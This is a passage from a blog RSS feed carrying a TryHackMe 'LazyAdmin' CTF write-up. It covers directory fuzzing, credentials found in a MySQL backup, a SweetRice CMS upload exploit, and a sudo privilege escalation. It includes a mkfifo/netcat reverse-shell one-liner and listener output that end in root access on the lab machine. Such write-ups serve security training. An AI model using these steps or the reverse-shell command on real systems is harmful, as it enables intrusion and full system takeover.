&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> /&lt;span class="s1">&amp;#39;___\ /&amp;#39;&lt;/span>___&lt;span class="se">\ &lt;/span> /&lt;span class="err">&amp;#39;&lt;/span>___&lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> /&lt;span class="se">\ \_&lt;/span>_/ /&lt;span class="se">\ \_&lt;/span>_/ __ __ /&lt;span class="se">\ \_&lt;/span>_/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\ \ &lt;/span>,__&lt;span class="se">\\&lt;/span> &lt;span class="se">\ &lt;/span>,__&lt;span class="se">\/\ \/\ \ \ \ &lt;/span>,__&lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> &lt;span class="se">\ \ \_&lt;/span>/ &lt;span class="se">\ \ \_&lt;/span>/&lt;span class="se">\ \ \_\ \ \ \ \_&lt;/span>/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\ \_\ &lt;/span> &lt;span class="se">\ \_\ &lt;/span> &lt;span class="se">\ \_&lt;/span>___/ &lt;span class="se">\ \_\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> &lt;span class="se">\/&lt;/span>_/ &lt;span class="se">\/&lt;/span>_/ &lt;span class="se">\/&lt;/span>___/ &lt;span class="se">\/&lt;/span>_/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> v2.1.0-dev
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">________________________________________________
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Method : GET
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: URL : http://10.10.243.20/FUZZ
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Wordlist : FUZZ: /usr/share/wordlists/dirb/big.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Follow redirects : &lt;span class="nb">false&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Calibration : &lt;span class="nb">false&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Timeout : &lt;span class="m">10&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Threads : &lt;span class="m">40&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">________________________________________________
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.htaccess &lt;span class="o">[&lt;/span>Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 1172ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.htpasswd &lt;span class="o">[&lt;/span>Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 4189ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">content &lt;span class="o">[&lt;/span>Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 57ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">server-status &lt;span class="o">[&lt;/span>Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 57ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">:: Progress: &lt;span class="o">[&lt;/span>20469/20469&lt;span class="o">]&lt;/span> :: Job &lt;span class="o">[&lt;/span>1/1&lt;span class="o">]&lt;/span> :: &lt;span class="m">353&lt;/span> req/sec :: Duration: &lt;span class="o">[&lt;/span>0:00:38&lt;span class="o">]&lt;/span> :: Errors: &lt;span class="m">0&lt;/span> ::
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>As we can see we got a content page, let’s see what’s in here.&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/LazyAdmin-writeup-THM/main/7474137c-0a7c-410b-8ed2-02a7b17020bd_Export-965f2a31-1018-4c8c-bca0-aab923e3538f/LazyAdmin%20e500b0ab8a7b40c8a695e2a7bb58621b/Untitled.png"
loading="lazy"
alt="Untitled"
>&lt;/p>
&lt;p>That’s great, now we know that the web page is using Basic CMS.&lt;/p>
&lt;p>For now I am just going to follow the tip that the default web page gave us: “If you are the webmaster,please go to Dashboard -&amp;gt; General -&amp;gt; Website setting”.&lt;/p>
&lt;p>but for doing that we first need to login and access the dashboard.&lt;/p>
&lt;p>I ran another directory scanner, this time inside content:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ffuf -u http://10.10.243.20/content/FUZZ -w /usr/share/wordlists/dirb/big.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> /&lt;span class="s1">&amp;#39;___\ /&amp;#39;&lt;/span>___&lt;span class="se">\ &lt;/span> /&lt;span class="err">&amp;#39;&lt;/span>___&lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> /&lt;span class="se">\ \_&lt;/span>_/ /&lt;span class="se">\ \_&lt;/span>_/ __ __ /&lt;span class="se">\ \_&lt;/span>_/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\ \ &lt;/span>,__&lt;span class="se">\\&lt;/span> &lt;span class="se">\ &lt;/span>,__&lt;span class="se">\/\ \/\ \ \ \ &lt;/span>,__&lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> &lt;span class="se">\ \ \_&lt;/span>/ &lt;span class="se">\ \ \_&lt;/span>/&lt;span class="se">\ \ \_\ \ \ \ \_&lt;/span>/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\ \_\ &lt;/span> &lt;span class="se">\ \_\ &lt;/span> &lt;span class="se">\ \_&lt;/span>___/ &lt;span class="se">\ \_\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> &lt;span class="se">\/&lt;/span>_/ &lt;span class="se">\/&lt;/span>_/ &lt;span class="se">\/&lt;/span>___/ &lt;span class="se">\/&lt;/span>_/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> v2.1.0-dev
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">________________________________________________
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Method : GET
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: URL : http://10.10.243.20/content/FUZZ
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Wordlist : FUZZ: /usr/share/wordlists/dirb/big.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Follow redirects : &lt;span class="nb">false&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Calibration : &lt;span class="nb">false&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Timeout : &lt;span class="m">10&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Threads : &lt;span class="m">40&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">________________________________________________
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.htpasswd &lt;span class="o">[&lt;/span>Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 1687ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">_themes &lt;span class="o">[&lt;/span>Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 55ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.htaccess &lt;span class="o">[&lt;/span>Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 2705ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">as &lt;span class="o">[&lt;/span>Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 57ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">attachment &lt;span class="o">[&lt;/span>Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 58ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">images &lt;span class="o">[&lt;/span>Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 57ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">inc &lt;span class="o">[&lt;/span>Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 57ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">js &lt;span class="o">[&lt;/span>Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 57ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">:: Progress: &lt;span class="o">[&lt;/span>20469/20469&lt;span class="o">]&lt;/span> :: Job &lt;span class="o">[&lt;/span>1/1&lt;span class="o">]&lt;/span> :: &lt;span class="m">271&lt;/span> req/sec :: Duration: &lt;span class="o">[&lt;/span>0:00:45&lt;span class="o">]&lt;/span> :: Errors: &lt;span class="m">0&lt;/span> ::
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>The dashboard is located in /content/as.&lt;/p>
&lt;p>But we don’t have the credentials yet.&lt;/p>
&lt;p>I went into inc, and there we can see a mysql backup:&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/LazyAdmin-writeup-THM/main/7474137c-0a7c-410b-8ed2-02a7b17020bd_Export-965f2a31-1018-4c8c-bca0-aab923e3538f/LazyAdmin%20e500b0ab8a7b40c8a695e2a7bb58621b/Untitled%201.png"
loading="lazy"
alt="Untitled"
>&lt;/p>
&lt;p>Here we can see the hashed password and the login username.&lt;/p>
&lt;p>manager:Password123&lt;/p>
&lt;p>Now we can see which version is running, after searching on internet I found this script: “https://www.exploit-db.com/exploits/40716”&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">+-&lt;span class="o">==&lt;/span>-&lt;span class="o">==&lt;/span>-&lt;span class="o">==&lt;/span>-&lt;span class="o">==&lt;/span>-&lt;span class="o">==&lt;/span>-&lt;span class="o">==&lt;/span>-&lt;span class="o">==&lt;/span>-&lt;span class="o">==&lt;/span>-&lt;span class="o">==&lt;/span>-&lt;span class="o">==&lt;/span>-&lt;span class="o">==&lt;/span>-&lt;span class="o">==&lt;/span>-&lt;span class="o">==&lt;/span>-&lt;span class="o">==&lt;/span>-&lt;span class="o">==&lt;/span>-&lt;span class="o">==&lt;/span>-&lt;span class="o">==&lt;/span>-&lt;span class="o">==&lt;/span>-&lt;span class="o">==&lt;/span>-&lt;span class="o">==&lt;/span>-&lt;span class="o">==&lt;/span>-&lt;span class="o">==&lt;/span>-+
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> _________ __ __________.__ &lt;span class="p">|&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> / _____/_ _ __ ____ _____/ &lt;span class="p">|&lt;/span>&lt;span class="se">\_&lt;/span>_____ &lt;span class="se">\_&lt;/span>_&lt;span class="p">|&lt;/span> ____ ____ &lt;span class="p">|&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="se">\_&lt;/span>____ &lt;span class="se">\ \/&lt;/span> &lt;span class="se">\/&lt;/span> // __ &lt;span class="se">\_&lt;/span>/ __ &lt;span class="se">\ &lt;/span> __&lt;span class="se">\ &lt;/span> _/ &lt;span class="p">|&lt;/span>/ ___&lt;span class="se">\/&lt;/span> __ &lt;span class="se">\ &lt;/span> &lt;span class="p">|&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> / &lt;span class="se">\ &lt;/span> /&lt;span class="se">\ &lt;/span> ___/&lt;span class="se">\ &lt;/span> ___/&lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="se">\ &lt;/span> &lt;span class="se">\ &lt;/span> &lt;span class="se">\_&lt;/span>_&lt;span class="se">\ &lt;/span> ___/ &lt;span class="p">|&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>/_______ / &lt;span class="se">\/\_&lt;/span>/ &lt;span class="se">\_&lt;/span>__ &amp;gt;&lt;span class="se">\_&lt;/span>__ &amp;gt;__&lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span>____&lt;span class="p">|&lt;/span>_ /__&lt;span class="p">|&lt;/span>&lt;span class="se">\_&lt;/span>__ &amp;gt;___ &amp;gt; &lt;span class="p">|&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &lt;span class="se">\/&lt;/span> &lt;span class="se">\/&lt;/span> &lt;span class="se">\/&lt;/span> &lt;span class="se">\/&lt;/span> &lt;span class="se">\/&lt;/span> &lt;span class="se">\/&lt;/span> &lt;span class="p">|&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &amp;gt; SweetRice 1.5.1 Unrestricted File Upload &lt;span class="p">|&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span> &amp;gt; Script Cod3r : Ehsan Hosseini &lt;span class="p">|&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">+-&lt;span class="o">==&lt;/span>-&lt;span class="o">==&lt;/span>-&lt;span class="o">==&lt;/span>-&lt;span class="o">==&lt;/span>-&lt;span class="o">==&lt;/span>-&lt;span class="o">==&lt;/span>-&lt;span class="o">==&lt;/span>-&lt;span class="o">==&lt;/span>-&lt;span class="o">==&lt;/span>-&lt;span class="o">==&lt;/span>-&lt;span class="o">==&lt;/span>-&lt;span class="o">==&lt;/span>-&lt;span class="o">==&lt;/span>-&lt;span class="o">==&lt;/span>-&lt;span class="o">==&lt;/span>-&lt;span class="o">==&lt;/span>-&lt;span class="o">==&lt;/span>-&lt;span class="o">==&lt;/span>-&lt;span class="o">==&lt;/span>-&lt;span class="o">==&lt;/span>-&lt;span class="o">==&lt;/span>-&lt;span class="o">==&lt;/span>-+
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Enter The Target URL&lt;span class="o">(&lt;/span>Example : localhost.com&lt;span class="o">)&lt;/span> : 10.10.243.20/content
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Enter Username : manager
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Enter Password : Password123
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Enter FileName &lt;span class="o">(&lt;/span>Example:.htaccess,shell.php5,index.html&lt;span class="o">)&lt;/span> : php.php
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Sending User&lt;span class="p">&amp;amp;&lt;/span>Pass...
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Login Succssfully...
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> File Uploaded...
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> URL : http://10.10.243.20/content/attachment/php.php
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>This one didn’t work so I am going to switch to another one that I have found: “https://www.exploit-db.com/exploits/40700”&lt;/p>
&lt;p>It bascially tells you to go and add a file in the ads section.&lt;/p>
&lt;p>after that we just navigate to the ads directory “http://10.10.243.20/content/inc/ads/” and we have our shell:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nc -lvnp &lt;span class="m">4444&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">listening on &lt;span class="o">[&lt;/span>any&lt;span class="o">]&lt;/span> &lt;span class="m">4444&lt;/span> ...
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">connect to &lt;span class="o">[&lt;/span>10.18.20.116&lt;span class="o">]&lt;/span> from &lt;span class="o">(&lt;/span>UNKNOWN&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>10.10.243.20&lt;span class="o">]&lt;/span> &lt;span class="m">35430&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Linux THM-Chal 4.15.0-70-generic &lt;span class="c1">#79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> 15:20:14 up &lt;span class="m">53&lt;/span> min, &lt;span class="m">0&lt;/span> users, load average: 0.00, 0.00, 0.07
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">uid&lt;/span>&lt;span class="o">=&lt;/span>33&lt;span class="o">(&lt;/span>www-data&lt;span class="o">)&lt;/span> &lt;span class="nv">gid&lt;/span>&lt;span class="o">=&lt;/span>33&lt;span class="o">(&lt;/span>www-data&lt;span class="o">)&lt;/span> &lt;span class="nv">groups&lt;/span>&lt;span class="o">=&lt;/span>33&lt;span class="o">(&lt;/span>www-data&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/bin/sh: 0: can&lt;span class="err">&amp;#39;&lt;/span>t access tty&lt;span class="p">;&lt;/span> job control turned off
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">$ whoami
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">www-data
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Going to the IT guy directory gives us the user flag.&lt;/p>
&lt;p>Now using sudo -l:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo -l
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Matching Defaults entries &lt;span class="k">for&lt;/span> www-data on THM-Chal:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> env_reset, mail_badpass, &lt;span class="nv">secure_path&lt;/span>&lt;span class="o">=&lt;/span>/usr/local/sbin&lt;span class="se">\:&lt;/span>/usr/local/bin&lt;span class="se">\:&lt;/span>/usr/sbin&lt;span class="se">\:&lt;/span>/usr/bin&lt;span class="se">\:&lt;/span>/sbin&lt;span class="se">\:&lt;/span>/bin&lt;span class="se">\:&lt;/span>/snap/bin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">User www-data may run the following commands on THM-Chal:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">(&lt;/span>ALL&lt;span class="o">)&lt;/span> NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>We can see that we can use perl and backup.pl with root privileges.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">cat /home/itguy/backup.pl
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#!/usr/bin/perl&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">system&lt;span class="o">(&lt;/span>&lt;span class="s2">&amp;#34;sh&amp;#34;&lt;/span>, &lt;span class="s2">&amp;#34;/etc/copy.sh&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>This basically just execute the &lt;code>/etc/copy.sh&lt;/code> file&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">rm /tmp/f&lt;span class="p">;&lt;/span>mkfifo /tmp/f&lt;span class="p">;&lt;/span>cat /tmp/f&lt;span class="p">|&lt;/span>/bin/sh -i 2&amp;gt;&lt;span class="p">&amp;amp;&lt;/span>1&lt;span class="p">|&lt;/span>nc 10.18.20.116 &lt;span class="m">4555&lt;/span> &amp;gt;/tmp/f
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>So I changed the cdoe with my ip and port, then executed with: sudo /usr/bin/perl /home/itguy/backup.pl and got the shell.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nc -lvnp &lt;span class="m">4555&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">listening on &lt;span class="o">[&lt;/span>any&lt;span class="o">]&lt;/span> &lt;span class="m">4555&lt;/span> ...
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">connect to &lt;span class="o">[&lt;/span>10.18.20.116&lt;span class="o">]&lt;/span> from &lt;span class="o">(&lt;/span>UNKNOWN&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>10.10.243.20&lt;span class="o">]&lt;/span> &lt;span class="m">56612&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">/bin/sh: 0: can&lt;span class="err">&amp;#39;&lt;/span>t access tty&lt;span class="p">;&lt;/span> job control turned off
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># whoami&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">root
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>GameZone Writeup THM</title><link>https://simonefelici.github.io/p/gamezone-writeup-thm/</link><pubDate>Thu, 28 Dec 2023 18:00:00 +0100</pubDate><guid>https://simonefelici.github.io/p/gamezone-writeup-thm/</guid><description>&lt;img src="https://images.unsplash.com/photo-1483335584694-fb0f729b0f9c?q=80&amp;w=2072&amp;auto=format&amp;fit=crop&amp;ixlib=rb-4.0.3&amp;ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D" alt="Featured image of post GameZone Writeup THM" />&lt;p>We are going to startwith a scan:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
